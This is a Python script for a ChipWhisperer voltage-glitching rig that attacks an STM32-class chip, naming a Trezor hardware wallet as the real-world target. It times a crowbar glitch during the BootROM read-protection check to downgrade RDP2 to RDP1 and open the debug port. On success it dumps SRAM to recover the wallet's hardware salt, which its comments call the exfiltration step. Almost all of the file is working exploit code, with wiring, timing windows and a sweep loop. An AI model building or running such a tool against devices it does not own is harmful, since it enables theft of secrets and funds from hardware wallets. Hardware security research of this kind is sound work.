#!/usr/bin/env python
"""glitch1_rdp2_to_rdp1.py
Boot-time RDP2 -> RDP1 glitch. NEW script, based on
scripts/1-recon_glitch_trace.py, adapted for the CURRENT storage-sim rig.

WHAT IT DOES
  Boots the chip NORMALLY into the firmware (BOOT0 low) and fires the VCAP
  crowbar during the BootROM option-byte RDP read (reset-triggered) to corrupt
  RDP2 -> RDP1 behaviour. glitch-1 acts in the BootROM BEFORE the firmware runs,
  so the firmware content is irrelevant. SUCCESS = SWD enumerates (debug port
  opens); on success it reads IDCODE / OPTCR / an SRAM word as validation.
  Read-only + crowbar: NO option-byte writes, NO erase. Safe for the chip.

======================= WIRING  (THIS BENCH) ==================================
  TIO1 -> chip BOOT0.  LOW = boot the firmware (default). (For a real Trezor the
          BOOT0 pin must be lifted off its hard GND tie first; on the socket
          board it's just a socket pin.)
  TIO4 -> chip pin 7 = NRST.  ONE wire, and it does BOTH jobs - no sense wire:
          - DRIVES reset:  tio4='gpio_low' holds the chip in reset.
          - TRIGGERS glitch: tio4='high_z' RELEASES reset; the line rises on the
            chip's internal NRST pull-up and the CW trigger block senses that
            rising edge ON THE SAME PIN (it reads the pin input the instant we
            stop driving it). That is the whole trick - a single CW TIO can
            drive a line low and then trigger on its own release edge.
  TIMING: t=0 is the reset RELEASE. The glitch fires ext_offset clock cycles
          later: ~180us @100MHz = ext ~18000. This is exactly the historical
          "reset, then apply the glitch at ~180us" behaviour - purely a delay
          from the reset we generate, nothing external is sensed.
  CROWBAR: glitch_hp + glitch_lp FETs -> VCAP SMA (same node as glitch-2).
  CLOCK:   clkgen 100 MHz. The ext_offset window 17000-18900 (= 170-189 us after
           reset release) is DEFINED at 100 MHz. Change clkgen => rescale
           (us = ext_offset / clkgen).
  SWD:     via ST-Link (the success check). CW handle is freed before each SWD
           attempt (they can't both hold the USB at once).
================================================================================

Env knobs: G1_EXT_MIN/MAX/STEP, G1_SAMPLES, G1_REPEAT, G1_WIDTH, G1_OFFSET,
G1_CLKGEN, G1_NRST (which TIO drives+triggers reset, default tio4),
G1_BOOT0 (low|high), G1_STOP_ON_SUCCESS, G1_COOLDOWN.
Run: /home/tdaly/.cwvenv/bin/python glitch1_rdp2_to_rdp1.py
"""
import os
import csv
import gc
import time
from datetime import datetime

import chipwhisperer as cw

CLKGEN   = float(os.environ.get('G1_CLKGEN', 100e6))     # glitch-1 window @100MHz
EXT_MIN  = int(os.environ.get('G1_EXT_MIN', 17000))
EXT_MAX  = int(os.environ.get('G1_EXT_MAX', 18900))
EXT_STEP = int(os.environ.get('G1_STEP', 1))
SAMPLES  = int(os.environ.get('G1_SAMPLES', 8))
REPEAT   = int(os.environ.get('G1_REPEAT', 20))
WIDTH    = int(os.environ.get('G1_WIDTH', 40))           # inert in enable_only
OFFSET   = int(os.environ.get('G1_OFFSET', -45))
# The TIO that is wired to NRST (pin 7). It both drives reset low and triggers
# the glitch on its own release edge - one pin, no separate sense wire.
NRST     = os.environ.get('G1_NRST', 'tio4').lower()
BOOT0_HI = os.environ.get('G1_BOOT0', 'low').lower() in ('high', '1', 'hi')
STOP_OK  = os.environ.get('G1_STOP_ON_SUCCESS', '1') == '1'
COOLDOWN = float(os.environ.get('G1_COOLDOWN', 0.1))
# Trigger method / t=0 frame. THIS IS THE MOST IMPORTANT KNOB - the three
# frames are DIFFERENT PHYSICAL INSTANTS and ext windows do NOT transfer
# between them:
#   'nrst'     - warm: NRST driven low (power on), released; t=0 = NRST rise.
#   'poweron'  - cold: POR owns NRST; t=0 = POR-release edge (BootROM start).
#   'old'      - cold, EXACT 1-recon/1-trezor_fun sequence (the only frame in
#                which ext 170-189us ever worked on a genuine part, 2026-10-11):
#                NRST driven low while UNPOWERED, released, THEN power returns;
#                t=0 = first rising edge as rails come up (VDD-ramp edge, NOT
#                POR-release). Differs from 'poweron' by the ramp+POR time.
TRIGGER  = os.environ.get('G1_TRIGGER', 'nrst').lower()
POWER_OFF_MS = float(os.environ.get('G1_POWER_OFF_MS', 60))   # power-off dwell
USB_RESET = '/home/tdaly/.cwvenv/usb_reset'

scope = None


def setup_scope():
    s = cw.scope()
    s.clock.clkgen_freq = CLKGEN              # FIRST (CLAUDE.md discipline)
    # ADC clock must be derived+locked for capture() (trigger-fire check) to
    # work; failure is non-fatal (trig status falls back to 'unknown').
    try:
        s.clock.adc_src = 'clkgen_x1'
        for _ in range(4):
            try:
                s.clock.reset_adc()
            except Exception:
                pass
            time.sleep(0.3)
            if s.clock.adc_locked:
                break
    except Exception:
        pass
    try:
        s.adc.timeout = 0.5                   # cheap NO-FIRE verdicts
    except Exception:
        pass
    s.adc.samples = 24400
    s.adc.offset = 0
    s.adc.basic_mode = 'rising_edge'
    s.adc.decimate = 10
    s.glitch.clk_src = 'clkgen'
    s.glitch.output = 'enable_only'           # crowbar
    s.glitch.trigger_src = 'ext_single'
    s.glitch.width = WIDTH
    s.glitch.offset = OFFSET
    s.glitch.repeat = REPEAT
    s.io.glitch_lp = True
    s.io.glitch_hp = True
    s.trigger.triggers = NRST                 # trigger on the NRST release edge
    setattr(s.io, NRST, 'high_z')             # idle: reset released (line high)
    s.io.tio1 = True if BOOT0_HI else False   # BOOT0 (low = firmware)
    s.io.tio2 = 'high_z'
    s.io.target_pwr = True                     # power the chip, leave it on
    return s


def reboot_flush():
    """Reset the chip and arm the glitch on the t=0 edge.
    nrst mode: power stays on; drive NRST low -> arm -> release. The release
      rising edge (CW senses it on the NRST pin) is t=0.
    poweron mode: full power-cycle; NRST left floating so the chip's internal POR
      holds it low then releases on power-up - that POR-release rising edge is
      t=0 (true cold boot, same frame as mkesenheimer's VCAP-rise trigger).
    old mode: the EXACT sequence of scripts/1-recon_glitch_trace.py
      (1-trezor_fun, ext-17000-first-try 2026-10-11): NRST asserted low while
      UNPOWERED, released, THEN power returns - t=0 is the first rising edge as
      the rails come up (VDD-ramp frame). ext 170-189us is only proven HERE.
    Either way the glitch fires ext_offset cycles after t=0."""
    if TRIGGER == 'old':
        scope.io.target_pwr = False           # power off
        setattr(scope.io, NRST, 'gpio_low')   # NRST low while unpowered
        time.sleep(POWER_OFF_MS / 1000.0)
        scope.arm()
        setattr(scope.io, NRST, 'high_z')     # release BEFORE power returns
        scope.io.target_pwr = True            # rails rise -> edge -> trigger
    elif TRIGGER == 'poweron':
        setattr(scope.io, NRST, 'high_z')     # let the chip's POR own NRST
        scope.io.target_pwr = False           # power OFF (cold)
        time.sleep(POWER_OFF_MS / 1000.0)     # full discharge (caps off -> fast)
        scope.arm()                           # arm BEFORE power-on
        scope.io.target_pwr = True            # power ON -> POR -> NRST rises -> trigger
    else:
        setattr(scope.io, NRST, 'gpio_low')   # assert reset (hold in reset)
        time.sleep(0.02)
        scope.arm()
        setattr(scope.io, NRST, 'high_z')     # release -> rising edge -> trigger


def trig_fired():
    """In-band trigger-fire check. scope.capture() blocks until the ADC
    triggers or times out; returns True on TIMEOUT. Called after each shot:
    fired = the glitch clock saw the t=0 edge (pulse went out); NO-FIRE =
    the arm never triggered, so the shot was a NO-OP - invisible in SWD
    results alone. Never run a long blind sweep without this."""
    try:
        return not scope.capture()            # timeout True -> fired False
    except Exception:
        return None                           # ADC unlocked etc -> unknown


def swd_check():
    """SWD enumerates => the boot glitch landed (RDP1 behaviour, debug open).
    On success, IMMEDIATELY dump SRAM while power is held (G1_SRAM_DUMP=1):
    the firmware booted BOOT0-low, so hardware_salt = SHA256(uid||otp) lives
    in its .bss - the Replicant/chip.fail exfiltration step."""
    try:
        if os.path.exists(USB_RESET):
            os.system(f'{USB_RESET} >/dev/null 2>&1')
        time.sleep(0.3)
        from swd.stlink import Stlink
        st = Stlink(swd_frequency=480000)
        idc = st.get_mem32(0xE0042000)
        try:
            optcr = st.get_mem32(0x40023C14); rdp = (optcr >> 8) & 0xFF
        except Exception:
            optcr = rdp = -1
        try:
            sram = st.get_mem32(0x20000000)
        except Exception:
            sram = -1
        info = (f'IDCODE=0x{idc:08X} OPTCR=0x{optcr:08X} RDP=0x{rdp:02X} '
                f'SRAM0=0x{sram:08X}')
        if os.environ.get('G1_SRAM_DUMP', '1') == '1':
            try:                              # never let the dump kill the win
                blob = bytearray()
                for off in range(0, 0x20000, 1024):   # 128 KB SRAM
                    blob += bytes(st.read_mem32(0x20000000 + off, 1024))
                os.makedirs('dumps', exist_ok=True)
                p = f'dumps/glitch1_sram_{datetime.now():%Y%m%d_%H%M%S}.bin'
                open(p, 'wb').write(blob)
                nz = sum(1 for b in blob if b)
                info += f' | SRAM 128KB -> {p} ({nz} non-zero bytes)'
            except Exception as e:
                info += f' | SRAM dump FAILED ({type(e).__name__})'
        del st; gc.collect()
        return True, info
    except Exception as e:
        return False, type(e).__name__


def teardown():
    global scope
    try:
        if scope:
            scope.io.glitch_lp = False
            scope.io.glitch_hp = False
            scope.io.target_pwr = 'high_z'
            scope.dis()
    except Exception:
        pass


def main():
    global scope
    print('=' * 68)
    print('glitch-1  RDP2 -> RDP1 boot glitch (adapted from 1-recon_glitch_trace)')
    print(f'clkgen={CLKGEN/1e6:g}MHz  NRST(drive+trigger)={NRST}  '
          f'BOOT0={"HIGH(bootloader)" if BOOT0_HI else "low(firmware)"}')
    print(f't=0 frame: {TRIGGER}'
          + ('  (VDD-ramp edge - the ONLY frame where 170-189us is proven)'
             if TRIGGER == 'old' else
             '  (POR-release edge - BootROM start)' if TRIGGER == 'poweron'
             else '  (warm NRST release)'))
    print(f'ext {EXT_MIN}-{EXT_MAX} ({EXT_MIN/ (CLKGEN/1e6):.0f}-{EXT_MAX/(CLKGEN/1e6):.0f}us) '
          f'step {EXT_STEP}  offset {OFFSET} repeat {REPEAT} (width {WIDTH} inert)')
    print('success = SWD enumerates.  *** confirm the wiring block first ***')
    print('=' * 68)
    scope = setup_scope()
    os.makedirs('campaigns', exist_ok=True)
    logp = os.path.join('campaigns', f'glitch1_{datetime.now():%Y%m%d_%H%M%S}.csv')
    lw = csv.writer(open(logp, 'w', newline=''))
    lw.writerow(['shot', 'ext_offset', 'us_after_reset', 'result', 'info'])

    shot = 0; ok_n = 0; no_trig = 0
    try:
        for ext in range(EXT_MIN, EXT_MAX + 1, EXT_STEP):
            scope.glitch.ext_offset = ext
            us = ext / (CLKGEN / 1e6)
            for _ in range(SAMPLES):
                shot += 1
                reboot_flush()
                time.sleep(0.15)
                fired = trig_fired()          # None = unknown, False = NO-FIRE
                if fired is False:
                    no_trig += 1
                ok, info = swd_check()
                trig_note = '' if fired else (' NO-FIRE' if fired is False
                                              else ' trig?')
                lw.writerow([shot, ext, round(us, 1),
                             'SUCCESS' if ok else 'nolink',
                             (info if ok else 'NO-FIRE' if fired is False
                              else 'trig?') if not ok else info])
                print(f'  [{datetime.now():%H:%M:%S}] #{shot} ext={ext} '
                      f'({us:.1f}us) -> {"SUCCESS" if ok else "nolink"}'
                      f'{trig_note}'
                      + (f'  {info}' if ok else ''), flush=True)
                if ok:
                    ok_n += 1
                    print(f'\n[***] GLITCH-1 SUCCESS ext={ext} ({us:.1f}us): {info}\n',
                          flush=True)
                    try: os.system("spd-say -r -10 'glitch one success' 2>/dev/null &")
                    except Exception: pass
                    if STOP_OK:
                        print('[+] STOP_ON_SUCCESS - debug port open; hold this '
                              'power state (do NOT power-cycle).')
                        return
                # swd_check never touches the CW handle, so no reconfigure is
                # needed between shots - just keep firing.
                time.sleep(COOLDOWN)
    finally:
        print(f'[=] done: {shot} shots, {ok_n} successes, '
              f'{no_trig} NO-FIRE (glitch never went out) -> {logp}')
        teardown()


if __name__ == '__main__':
    main()
